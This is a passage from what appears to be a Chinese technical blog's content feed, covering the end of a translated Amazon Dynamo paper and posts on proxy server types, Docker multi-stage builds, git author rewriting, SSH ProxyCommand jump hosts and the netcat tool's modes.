访问失败次数，以及请求队列的等待时间。这些信息用于判断在给定的时间窗口之内的延迟 （或失败）性能是否在可接受的范围内。例如，后台控制器检查数据库（过去 <code>60s</code>）的 <code>P99</code> 读延迟是否离预设的阈值（例如 <code>50ms</code>）足够近。控制器正是根据这些对比信息为 前台操作评估资源的可用性，然后决定给后台任务分配多少时间片，因此利用反馈回路限制 了后台任务的侵入性（intrusiveness ）。[4] 也研究了类似的后台任务管理问题。</p><h3 id="6-6-讨论"><a href="#6-6-讨论" class="headerlink" title="6.6 讨论"></a>6.6 讨论</h3><p>本节总结我们在开发和维护 Dynamo 的过程中获得的一些经验。</p><p>很多 Amazon 的内部服务在过去的两年都开始使用 Dynamo，它给应用提供了非常高等级（ significant levels）的可用性。具体来说，使用 Dynamo 的应用，响应成功率（不包括超 时？）达到了 <code>99.9995%</code>（<strong>applications have received successful responses (without timing out) for 99.9995% of its requests</strong>），并且到目前位置还没有发 生过丢失数据的情况。</p><p>Dynamo 的主要优势是：给应用提供了配置能力，应用可以根据自己的需求对 <code>(N,R,W)</code> 进 行调优。</p><p>和流行的商业数据仓库不同，Dynamo 将数据一致性和 reconciliation 逻辑开放给了开发 者。刚开始时，有人可能会觉得这样会使应用逻辑变得更复杂。但从传统来看（ historically），Amazon 平台就是为高可用设计的，很多<strong>应用在设计的时候就考虑了如 何处理可能出现的各种故障模式（failure modes）和不一致问题</strong>。对于这类应用来说， 适配 Dynamo 相对还是比较简单的。对于想要使用 Dynamo 的新应用，就需要首先花一些时 间做一些分析，在开发初期，选择满足业务需求的合适的冲突解决机制（conflict resolution mechanisms）。</p><p>最后，Dynamo 采用了一种<strong>full membership model</strong>（完整成员模型），在这种模型中， 每个节点都知道它的对端（peer）节点存储哪些数据。在实现中，每个节点要主动将完整路 由表 gossip 给系统内的其他节点。这个模型<strong>对几百台、上千台节点的规模很适用</strong>。但 对于上万台节点的规模就不适应了，因为维护这么大一个系统的路由表开销会大大增加。 但是，可以通过向 Dynamo 引入<strong>hierarchical extensions</strong>（层级扩展）来解决这个限制。 <code>O(1)</code> 复杂度的的动态哈希树系统（DHS）（例如 [14]）解决的就是这种问题。</p><blockquote><p>this problem is actively addressed by O(1) DHT systems(e.g., [14]).</p></blockquote><h2 id="7-结束语"><a href="#7-结束语" class="headerlink" title="7. 结束语"></a>7. 结束语</h2><p>本文介绍了 Dynamo，一个高可用、高可扩展的数据仓库（data store），在 Amazon 电商 平台用于存储许多核心服务的状态数据。</p><p>Dynamo 提供了期望的可用性和性能等级，可以正确地处理服务器故障、数据中心故障和网 络分裂。</p><p>Dynamo 可以增量扩展，允许服务所有者根据负载高低动态的对 Dynamo 系统进行扩缩容； 允许服务所有者根据他们的性能、持久性和一致性 SLA 需求，通过调优 <code>N``R``W</code> 三个参 数来定制化它们的存储系统。</p><p>过去几年 Dynamo 在生产环境的实践表明：一些去中心化技术结合起来，可以提供一个高度 可用的系统。这种在极具挑战性的应用环境的成功也表明，<strong>最终一致性存储系统可以作为 高可用应用（highly available applications）的一块基石</strong>。</p><blockquote><p>The production use of Dynamo for the past year demonstrates that decentralized techniques can be combined to provide a single highly-available system. Its success in one of the most challenging application environments shows that an eventualconsistent storage system can be a building block for highlyavailable applications.</p></blockquote><h3 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h3><p>The authors would like to thank Pat Helland for his contribution to the initial design of Dynamo. We would also like to thank Marvin Theimer and Robert van Renesse for their comments. Finally, we would like to thank our shepherd, Jeff Mogul, for his detailed comments and inputs while preparing the camera ready version that vastly improved the quality of the paper.</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ol><li>Adya, et al. Farsite: federated, available, and reliable storage for an incompletely trusted environment. SIGOPS 2002</li><li>Bernstein, P.A., et al. An algorithm for concurrency control and recovery in replicated distributed databases. ACM Trans. on Database Systems, 1984</li><li>Chang, et al. <strong>Bigtable: a distributed storage system for structured data</strong>. In Proceedings of the 7th Conference on USENIX Symposium on Operating Systems Design and Implementation, 2006</li><li>Douceur, et al. Process-based regulation of low-importance processes. SIGOPS 2000</li><li>Fox, et al. Cluster-based scalable network services. SOSP, 1997</li><li>Ghemawat, et al. <strong>The Google file system</strong>. SOSP, 2003</li><li>Gray, et al. The dangers of replication and a solution. SIGMOD 1996</li><li>Gupta, et al. On scalable and efficient distributed failure detectors. In Proceedings of the Twentieth Annual ACM Symposium on Principles of Distributed Computing. 2001</li><li>Kubiatowicz, et al. OceanStore: an architecture for global-scale persistent storage. SIGARCH Comput. Archit. News, 2000</li><li>Karger, et al. Consistent hashing and random trees: distributed caching protocols for relieving hot spots on the World Wide Web. STOC 1997</li><li>Lindsay, et al. “Notes on Distributed Databases”, Research Report RJ2571(33471), IBM Research, 1979</li><li>Lamport, L. <strong>Time, clocks, and the ordering of events in a distributed system</strong>. ACM Communications, 1978</li><li>Merkle, R. A digital signature based on a conventional encryption function. Proceedings of CRYPTO, 1988</li><li>Ramasubramanian, et al. Beehive: O(1)lookup performance for power-law query distributions in peer-topeer overlays. In Proceedings of the 1st Conference on Symposium on Networked Systems Design and Implementation, , 2004</li><li>Reiher, et al. Resolving file conflicts in the Ficus file system. In Proceedings of the USENIX Summer 1994 Technical Conference, 1994</li><li>Rowstron, et al. Pastry: Scalable, decentralized object location and routing for large-scale peerto- peer systems. Proceedings of Middleware, 2001.</li><li>Rowstron, et al. Storage management and caching in PAST, a large-scale, persistent peer-to-peer storage utility. Proceedings of Symposium on Operating Systems Principles, 2001</li><li>Saito, et al. FAB: building distributed enterprise disk arrays from commodity components. SIGOPS 2004</li><li>Satyanarayanan, et al. Coda: A Resilient Distributed File System. IEEE Workshop on Workstation Operating Systems, 1987.</li><li>Stoica, et al. Chord: A scalable peer-to-peer lookup service for internet applications. SIGCOMM 2001</li><li>Terry, et al. Managing update conflicts in Bayou, a weakly connected replicated storage system. SOSP 1995</li><li>Thomas. A majority consensus approach to concurrency control for multiple copy databases. ACM Transactions on Database Systems, 1979.</li><li>Weatherspoon, et al. Antiquity: exploiting a secure log for wide-area distributed storage. SIGOPS 2007</li><li>Welsh, et al. SEDA: an architecture for well-conditioned, scalable internet services. SOSP 2001</li></ol><p>本文转自：<a href="https://arthurchiao.github.io/blog/amazon-dynamo-zh/">https://arthurchiao.github.io/blog/amazon-dynamo-zh/</a></p>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 数据库 </category>
          
          <category> 键值数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> NoSQL </tag>
            
            <tag> 分布式 </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正向/反向/透明代理服务器对比</title>
      <link href="/2019/10/12/proxy/"/>
      <url>/2019/10/12/proxy/</url>
      
        <content type="html"><![CDATA[<h2 id="一、正向代理"><a href="#一、正向代理" class="headerlink" title="一、正向代理"></a>一、正向代理</h2><p>正向代理是一个位于客户端和目标服务器之间的服务器，为了从目标服务器取得内容，客户端需要向代理服务器发送一个请求并指定目标服务器，然后代理服务器向目标服务器转交请求并将获得的内容返回给客户端。</p><p><img src="/assets/images/proxy-forward.png" alt="正向代理" loading="lazy"></p><h3 id="1-1、特点"><a href="#1-1、特点" class="headerlink" title="1.1、特点"></a>1.1、特点</h3><ul><li>用户无法直接访问目标服务器；</li><li>客户端明确知道自己访问的是代理服务器；</li><li>隐藏真实的客户端IP；</li></ul><h3 id="1-2、使用场景"><a href="#1-2、使用场景" class="headerlink" title="1.2、使用场景"></a>1.2、使用场景</h3><ul><li>为防火墙（局域网）内的客户端提供访问互联网的途径；</li><li>客户端的鉴权；</li><li>提供数据缓存，访问加速服务；</li></ul><h3 id="1-3、相关软件"><a href="#1-3、相关软件" class="headerlink" title="1.3、相关软件"></a>1.3、相关软件</h3><ul><li><p>Nginx</p></li><li><p>Apache Traffic Server</p></li><li><p>Tinyproxy</p></li><li><p>Squid Cache</p></li></ul><h2 id="二、反向代理"><a href="#二、反向代理" class="headerlink" title="二、反向代理"></a>二、反向代理</h2><p>反向代理服务器位于客户端与目标服务器之间，但是对于客户端而言，反向代理服务器就相当于目标服务器，即客户端直接访问反向代理服务器就可以获得目标服务器的资源。同时，客户端不需要知道目标服务器的地址，也无须在客户端作任何设定。</p><p><img src="/assets/images/proxy-reverse.png" alt="反向代理" loading="lazy"></p><h3 id="2-1、特点"><a href="#2-1、特点" class="headerlink" title="2.1、特点"></a>2.1、特点</h3><ul><li>客户端不知道访问的是代理服务器，客户端认为访问的就是实际的目标服务器；</li><li>目标服务器不知道访问请求来源于代理服务器。目标服务器认为发送请求的就是普通的客户端；</li></ul><h3 id="2-2、使用场景"><a href="#2-2、使用场景" class="headerlink" title="2.2、使用场景"></a>2.2、使用场景</h3><ul><li>网络的负载均衡；</li><li>保护和隐藏目标服务器；</li></ul><h3 id="2-3、相关软件"><a href="#2-3、相关软件" class="headerlink" title="2.3、相关软件"></a>2.3、相关软件</h3><ul><li>Nginx</li><li>Apache HTTP Server</li><li>IIS</li><li>Traffic Server</li><li>HAProxy</li><li>Squid</li></ul><h2 id="三、透明代理"><a href="#三、透明代理" class="headerlink" title="三、透明代理"></a>三、透明代理</h2><p>客户端根本不知道有代理服务器的存在，它改变客户端&#x2F;目标服务器的报文信息，并会传送真实IP。</p><p><img src="/assets/images/proxy-transparent.png" alt="透明代理" loading="lazy"></p><h3 id="3-1、特点"><a href="#3-1、特点" class="headerlink" title="3.1、特点"></a>3.1、特点</h3><ul><li>客户端不知道代理服务的存在；</li></ul><h3 id="3-2、使用场景"><a href="#3-2、使用场景" class="headerlink" title="3.2、使用场景"></a>3.2、使用场景</h3><ul><li>路由器的NAT转发；</li></ul><h3 id="3-3、相关软件"><a href="#3-3、相关软件" class="headerlink" title="3.3、相关软件"></a>3.3、相关软件</h3><ul><li><p>Squid</p></li><li><p>Polipo</p></li><li><p>Tinyproxy</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 代理服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker多阶段构建的理解与使用</title>
      <link href="/2019/10/11/docker-multi-stage-builds/"/>
      <url>/2019/10/11/docker-multi-stage-builds/</url>
      
        <content type="html"><![CDATA[<p>在构建镜像的过程中可能会区分为编译镜像以及运行镜像，我们在编译环境中进行二进制运行文件的构建编译工作，然后将运行文件放置在运行环境中构建体积较小的运行镜像，在这个过程中，我们可能会使用到多阶段构建。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>在<code>Docker</code>的<code>17.05</code>及更高的版本中支持了多阶段构建的方式，多阶段构建的方式极大的减小了需要阶段性构建的复杂度。<a href="https://docs.docker.com/develop/develop-images/multistage-build/">官方介绍 - multistage-build</a></p><h2 id="二、多阶段构建的前后对比"><a href="#二、多阶段构建的前后对比" class="headerlink" title="二、多阶段构建的前后对比"></a>二、多阶段构建的前后对比</h2><h3 id="2-1、使用多阶段构建之前"><a href="#2-1、使用多阶段构建之前" class="headerlink" title="2.1、使用多阶段构建之前"></a>2.1、使用多阶段构建之前</h3><p>构建Docker镜像的过程中，最具挑战性的事情就是如何保证Docker镜像的尺寸能够尽可能的小。但是在编译的过程中，我们可能会产生一些多余的中间件，但是很多情况下我们可能只需要最终的可运行的二进制文件，并不需要编译环境中的多余组件。</p><p>实际上，通常只有一个<code>Dockerfile</code>用于开发（包含构建应用程序所需的一切），而精简的<code>Dockerfile</code>用于生产时，它仅包含您的应用程序以及运行它所需的内容。这被称为“构建者模式”。维护两个<code>Dockerfile</code>是不理想的，并且也会十分复杂。</p><ul><li><code>Dockerfile.build</code>：用于开发构建的<code>Dockerfile</code>；</li><li><code>Dockerfile</code>：用于生产环境的<code>Dockerfile</code>；</li><li><code>build.sh</code>：构建第一个镜像并从中创建一个容器以复制出最终的二进制运行文件，然后构建第二个镜像；</li></ul><h4 id="2-1-1、Dockerfile-build"><a href="#2-1-1、Dockerfile-build" class="headerlink" title="2.1.1、Dockerfile.build"></a>2.1.1、Dockerfile.build</h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> golang:<span class="hljs-number">1.7</span>.<span class="hljs-number">3</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /go/src/github.com/alexellis/href-counter/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> app.go .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> go get -d -v golang.org/x/net/html \</span><br><span class="language-bash">  &amp;&amp; CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .</span><br></code></pre></td></tr></table></figure><h4 id="2-1-2、Dockerfile"><a href="#2-1-2、Dockerfile" class="headerlink" title="2.1.2、Dockerfile"></a>2.1.2、Dockerfile</h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> alpine:latest  <br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk --no-cache add ca-certificates</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /root/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> app .</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;./app&quot;</span>]</span><br></code></pre></td></tr></table></figure><h4 id="2-1-3、build-sh"><a href="#2-1-3、build-sh" class="headerlink" title="2.1.3、build.sh"></a>2.1.3、build.sh</h4><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#!/bin/sh</span><br>echo Building alexellis2/href-counter:build<br><br>docker build --build-<span class="hljs-keyword">arg</span> https_proxy=$https_proxy --build-<span class="hljs-keyword">arg</span> http_proxy=$http_proxy \  <br>    -t alexellis2/href-counter:build . -f Dockerfile.build<br><br>docker container create --name extract alexellis2/href-counter:build  <br>docker container cp extract:/go/src/github.com/alexellis/href-counter/app ./app  <br>docker container rm -f extract<br><br>echo Building alexellis2/href-counter:latest<br><br>docker build --no-cache -t alexellis2/href-counter:latest .<br>rm ./app<br></code></pre></td></tr></table></figure><h3 id="2-2、使用多阶段构建"><a href="#2-2、使用多阶段构建" class="headerlink" title="2.2、使用多阶段构建"></a>2.2、使用多阶段构建</h3><p>极大的降低了复杂度，第二<code>FROM</code>条指令以<code>alpine:latest</code>图像为基础开始新的构建阶段。该<code>COPY --from=0</code>行仅将先前阶段中构建产生的文件复制到当前的构建阶段中，Go相关的SDK和任何中间工件都没有保存在最终景象中;</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> golang:<span class="hljs-number">1.7</span>.<span class="hljs-number">3</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /go/src/github.com/alexellis/href-counter/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> go get -d -v golang.org/x/net/html  </span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> app.go .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .</span><br><br><span class="hljs-keyword">FROM</span> alpine:latest<br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk --no-cache add ca-certificates</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /root/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=0 /go/src/github.com/alexellis/href-counter/app .</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;./app&quot;</span>]</span><br></code></pre></td></tr></table></figure><h2 id="三、多阶段构建的使用姿势"><a href="#三、多阶段构建的使用姿势" class="headerlink" title="三、多阶段构建的使用姿势"></a>三、多阶段构建的使用姿势</h2><h3 id="3-1、阶段的命名"><a href="#3-1、阶段的命名" class="headerlink" title="3.1、阶段的命名"></a>3.1、阶段的命名</h3><ul><li><code>整数编号</code>：默认情况下，构建阶段未命名，但是我们可以使用整数编号来进行引用，起始编号为<code>0</code>；</li><li><code>AS &lt;NAME&gt;</code>命名：在使用<code>FROM</code>指令中同时使用<code>AS [NAME] </code>来进行阶段的命名操作；</li></ul><h3 id="3-2、特定的构建阶段停止"><a href="#3-2、特定的构建阶段停止" class="headerlink" title="3.2、特定的构建阶段停止"></a>3.2、特定的构建阶段停止</h3><p>示例Dockerfile：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> golang:<span class="hljs-number">1.7</span>.<span class="hljs-number">3</span> AS builder<br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /go/src/github.com/alexellis/href-counter/</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> go get -d -v golang.org/x/net/html  </span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> app.go    .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .</span><br><br><span class="hljs-keyword">FROM</span> alpine:latest  <br><span class="hljs-keyword">RUN</span><span class="language-bash"> apk --no-cache add ca-certificates</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /root/</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=builder /go/src/github.com/alexellis/href-counter/app .</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;./app&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>构建镜像时，不一定需要构建包括每个阶段的整个Dockerfile。您可以指定目标构建阶段，以下命令含义为<code>builder</code>的阶段构建停止：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker build --target builder -t alexellis2/href-counter:latest .<br></code></pre></td></tr></table></figure><h3 id="3-3、将外部镜像作为阶段使用"><a href="#3-3、将外部镜像作为阶段使用" class="headerlink" title="3.3、将外部镜像作为阶段使用"></a>3.3、将外部镜像作为阶段使用</h3><p>使用多阶段构建时，您不仅限于从之前在<code>Dockerfile</code>中创建的阶段进行复制。您可以使用<code>COPY --from</code>指令从单独的映像进行复制，方法是使用本地映像名称，本地或<code>Docker</code>注册表上可用的标签或标签ID。Docker客户端在必要时提取映像并从那里复制工件。语法为：</p><figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> --from=nginx:latest /etc/nginx/nginx.conf /nginx.conf</span><br></code></pre></td></tr></table></figure><h2 id="四、多阶段构建的理解"><a href="#四、多阶段构建的理解" class="headerlink" title="四、多阶段构建的理解"></a>四、多阶段构建的理解</h2><h3 id="4-1、docker的层级概念"><a href="#4-1、docker的层级概念" class="headerlink" title="4.1、docker的层级概念"></a>4.1、docker的层级概念</h3><ul><li><code>文件层级</code>：<code>Docker</code>镜像可以理解为由多层的文件构成，当进行镜像的构建过程中，每执行一次<code>RUN</code>指令，镜像中就会增加一层；</li><li><code>起始层（根镜像）</code>：构建镜像的时候需要使用<code>FROM</code>指令选择一个基础镜像，即根镜像，后续所有的操作都会基于这个根镜像进行，<code>Docker</code>镜像只允许有一个根镜像，在多阶段构建中虽然使用了多个<code>FROM</code>指令，但是只有最后一个才是最终构建的根镜像；</li><li><code>层共享</code>：当我们的操作系统中只存在一个镜像，且该镜像的层数为<code>5</code>，当我们基于这个镜像构建新的镜像（新镜像比之前的镜像多出<code>2层</code>）进行构建的时候，最终在系统一共保存了<code>7层</code>，而不是<code>5+7=12层</code>，这就是<code>Docker</code>镜像的层共享；</li><li><code>联合挂载</code>：由于<code>Docker</code>的每一层只记录文件变更，因此在新启动一个容器的时候会计算当时使用镜像的每一层的信息，最终生成一个文件系统，这就是联合挂载的含义；</li></ul><h3 id="4-2、多个FROM的理解"><a href="#4-2、多个FROM的理解" class="headerlink" title="4.2、多个FROM的理解"></a>4.2、多个FROM的理解</h3><ul><li><p><code>中间产物</code>：在执行多个<code>FROM</code>之后，系统内会存在多个没有名称和<code>TAG</code>的无名镜像，这些镜像就是在多阶段构建中产生的中间镜像；</p></li><li><p><code>最终依赖</code>：多阶段构建中的多个<code>FROM</code>中只有最后一个<code>FROM</code>的镜像才是最终镜像的根镜像，在构建才是最终构建的根镜像；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git使用技巧</title>
      <link href="/2019/10/10/git-skill/"/>
      <url>/2019/10/10/git-skill/</url>
      
        <content type="html"><![CDATA[<h2 id="一、分支管理"><a href="#一、分支管理" class="headerlink" title="一、分支管理"></a>一、分支管理</h2><h2 id="二、提交日志管理"><a href="#二、提交日志管理" class="headerlink" title="二、提交日志管理"></a>二、提交日志管理</h2><ul><li>批量替换历史提交日志的用户名和邮箱信息</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git filter-branch -f --env-filter <span class="hljs-string">&#x27;</span><br><span class="hljs-string">OLD_NAME=&quot;old_name&quot;</span><br><span class="hljs-string">OLD_EMAIL=&quot;old@mail.com&quot;</span><br><span class="hljs-string">CORRECT_NAME=&quot;new_name&quot;</span><br><span class="hljs-string">CORRECT_EMAIL=&quot;new@mail.com&quot;</span><br><span class="hljs-string">if [ &quot;$GIT_COMMITTER_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]</span><br><span class="hljs-string">then</span><br><span class="hljs-string">    export GIT_COMMITTER_NAME=&quot;$CORRECT_NAME&quot;</span><br><span class="hljs-string">    export GIT_COMMITTER_EMAIL=&quot;$CORRECT_EMAIL&quot;</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;$OLD_EMAIL&quot; ]</span><br><span class="hljs-string">then</span><br><span class="hljs-string">    export GIT_AUTHOR_NAME=&quot;$CORRECT_NAME&quot;</span><br><span class="hljs-string">    export GIT_AUTHOR_EMAIL=&quot;$CORRECT_EMAIL&quot;</span><br><span class="hljs-string">fi</span><br><span class="hljs-string">&#x27;</span> --tag-name-filter <span class="hljs-built_in">cat</span> -- --branches --tags<br></code></pre></td></tr></table></figure><h2 id="三、用户管理"><a href="#三、用户管理" class="headerlink" title="三、用户管理"></a>三、用户管理</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssh的高级用法 - ProxyCommand</title>
      <link href="/2019/10/09/ssh-proxycommand/"/>
      <url>/2019/10/09/ssh-proxycommand/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><code>OpenSSH</code>的客户端有一个 <code>ProxyCommand</code> 的选项，用于 <code>SSH 客户端</code>与<code>服务器</code>之间的<code>隧道通信(tunneling)</code>。所谓的隧道技术，也称代理技术，是网络通信技术的一个普遍概念，就是把一条信道建立于另外一条信道之上。</p><p><code>SSH</code> 会话基于一个 <code>TCP</code> 连接，如果我们把连接的两个端口各自的出口（也即入口）进行截获，就可以用其它的信道来传输。而且 <code>SSH</code> 仍然认为它用的是和另一端连接一条<code> TCP</code> 连接。</p><p><code>ProxyCommand</code> 指定一个命令（称为<code> Proxy</code>），<code>SSH</code> 客户端将通过标准输入输出和这个命令启动后的进程进行正常的 <code>SSH</code> 通信，而 <code>Proxy</code> 连接着<code> SSH</code> 服务器（一般是一个 <code>Server Proxy</code>，再由该 <code>Server Proxy</code> 连接服务器）。<code>Proxy</code> 和 <code>Server Proxy</code> 之间组成了一条隧道，如果两者之间用 <code>HTTP</code> 协议进行通信，则整个系统便称为<code>tunneling SSH over HTTP</code>，当然也可以使用 <code>UDP</code>、<code>TCP</code>、<code>IP</code> 以及其它任意的可行的协议。</p><p><code>SSH ProxyCommand</code> 相对于 <code>SOCKS</code>、<code>HTTP</code> 或者其它的<code>Proxy</code>技术来说更简单。因为它工作在进程间的<code>文件 IO </code>通信，用任何支持 <code>socket</code> 的编程语言，都能轻易地编写出一个可用的 Proxy，复杂度只落在隧道本身。想一想，如果没有 <code>ProxyCommand</code>，你需要改变或侵入操作系统的 <code>TCP 子系统</code>才能实现 <code>SSH 隧道</code>。<code>ProxyCommand</code> 提供了方便应用隧道的接口，网络程序都应该提供这样的接口，而不是完全依赖于 socket。</p><p>因为一个会话就会启动一个 ProxyCommand 进程，所以只有在会话依赖于连接的协议上才能使用这种技术。</p><h2 id="二、实践"><a href="#二、实践" class="headerlink" title="二、实践"></a>二、实践</h2><p>环境说明</p><ul><li>远程服务器的IP地址为<code>180.0.0.1</code>，代号为<code>X</code>；</li><li>另一个远程服务器的IP为<code>180.0.0.2</code>，代号为<code>Y</code>；</li><li>目前本机的IP地址为<code>10.0.0.1</code>，代号为<code>A</code>，本地可以利用SSH客户端通过密钥或密码连接<code>X</code>和<code>Y</code>；</li></ul><p>这里实际使用的为全部使用密钥的方式进行访问，暂时<code>X</code>与<code>Y</code>之间无法通过密钥进行访问。</p><h3 id="2-1、通过ssh原生支持的指令实现"><a href="#2-1、通过ssh原生支持的指令实现" class="headerlink" title="2.1、通过ssh原生支持的指令实现"></a>2.1、通过ssh原生支持的指令实现</h3><p><code>A</code>本地的<code>～/.ssh/config</code>的配置文件信息如下，通过X连接到Y；</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Host X<br>        HostName 180.0.0.1<br>        User bugwz<br>        Port 18001<br>        PreferredAuthentications publickey<br>        IdentityFile ~/.ssh/bugwz_181<br>Host Y<br>        HostName 180.0.0.2<br>        User bugwz<br>        Port 18002<br>        PreferredAuthentications publickey<br>        IdentityFile ~/.ssh/bugwz_182<br>Host <span class="hljs-built_in">test</span><br>    HostName 180.0.0.2<br>    User bugwz<br>    Port 18002<br>    IdentityFile ~/.ssh/bugwz_182<br>    ProxyCommand ssh X -W %h:%p<br></code></pre></td></tr></table></figure><p><strong>原理分析：</strong></p><ul><li>本地<code>A</code>机器通过<code>ProxyCommand</code>先与<code>X</code>建立一个<code>SSH</code>连接，并把这个连接当作一个代理使用；</li><li><code>X</code>在与<code>Y</code>建立<code>SSH</code>连接，使用的认证方式为<code>A</code>的认证密钥，因此不需要将认证密钥存放在<code>X</code>端；</li><li><code>A</code>与<code>Y</code>就建立了一个间接的<code>SSH</code>连接；</li></ul><p><strong>困惑：</strong></p><p>目前遇到一个现象，当我们通过<code>X</code>连接到<code>Y</code>之后，在将<code>X</code>上的<code>sshd</code>杀掉之后，发现在<code>A</code>上与<code>Y</code>建立的连接依旧保持通畅，但是再次新建通过<code>X</code>访问<code>Y</code>的链接无法成功建立，怀疑这与sshd的机制有关系，是否会保持已有的会话连接？后续继续分析一下，此处保留困惑。</p><h3 id="2-2、借助nc来实现"><a href="#2-2、借助nc来实现" class="headerlink" title="2.2、借助nc来实现"></a>2.2、借助nc来实现</h3><p>一些说明：</p><ul><li><code>-W</code>：该参数在<code>OpenSSH 5.4</code>及之后的版本才支持，参考<a href="http://www.openssh.com/txt/release-5.4">官方的Release信息</a>；</li></ul><p>在使用<code>-W</code>之前，通常都是使用<code>nc</code>选项，<code>nc</code>允许你转发<code>TCP/UDP</code>数据包到指定（备用）位置并且基本上与<code>ssh -W</code>相同；</p><p>待补充！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc指令的使用与源码解析 - 每周指令</title>
      <link href="/2019/09/28/command-nc/"/>
      <url>/2019/09/28/command-nc/</url>
      
        <content type="html"><![CDATA[<p><code>nc</code>的全称为<a href="http://netcat.sourceforge.net/">Netcat</a>，是一款拥有多种功能的 CLI 工具，可以在网络上进行读&#x2F;写以及重定向数据等操作，被誉为是网络界的瑞士军刀。它被设计成可以被脚本或其他程序调用的可靠的后端工具。同时由于它能创建任意所需的连接，因此它是一个非常好用的网络工具，它的主要用途为：</p><ul><li><code>文件传输</code>：由于是直接建立TCP连接发送数据流，因此使用nc传输文件是不安全的，但是速度很快；</li><li><code>端口扫描</code>：可用于批量扫描指定IP的端口是否可用；</li><li><code>代理服务器</code>：简单的代理服务器；</li><li>等等；</li></ul><h2 id="一、源码解析"><a href="#一、源码解析" class="headerlink" title="一、源码解析"></a>一、源码解析</h2><ul><li><p>官方nc（Netcat）的代码的下载地址为：<a href="http://netcat.sourceforge.net/download.php%EF%BC%9B">http://netcat.sourceforge.net/download.php；</a></p></li><li><p>nc（Netcat）各版本的代码已经存储到 <a href="https://github.com/bugwz/netcat">bugwz&#x2F;netcat</a>；</p></li></ul><h3 id="1-1、工作模式"><a href="#1-1、工作模式" class="headerlink" title="1.1、工作模式"></a>1.1、工作模式</h3><p>nc共有四种连接模式，一下列出的连接模式按照索引等级由低到高，具体模式的含义解释以及相关的结构体代码如下所示：</p><ul><li><p><code>未制定模式</code>：默认的模式；</p></li><li><p><code>连接模式</code>：未使用<code>-l</code>和<code>-L</code>参数，通常为客户端连接其他IP的对应端口时启用该模式；</p></li><li><p><code>监听模式</code>：使用<code>-l</code>参数进入该模式；</p></li><li><p><code>隧道模式</code>：使用<code>-L</code>参数进入该模式；</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>  NETCAT_UNSPEC,<br>  NETCAT_CONNECT,<br>  NETCAT_LISTEN,<br>  NETCAT_TUNNEL<br>&#125; <span class="hljs-type">nc_mode_t</span>;<br></code></pre></td></tr></table></figure><h3 id="1-2、支持协议"><a href="#1-2、支持协议" class="headerlink" title="1.2、支持协议"></a>1.2、支持协议</h3><p>nc支持TCP和UDP协议，默认支持的协议为TCP协议；</p><figure class="highlight 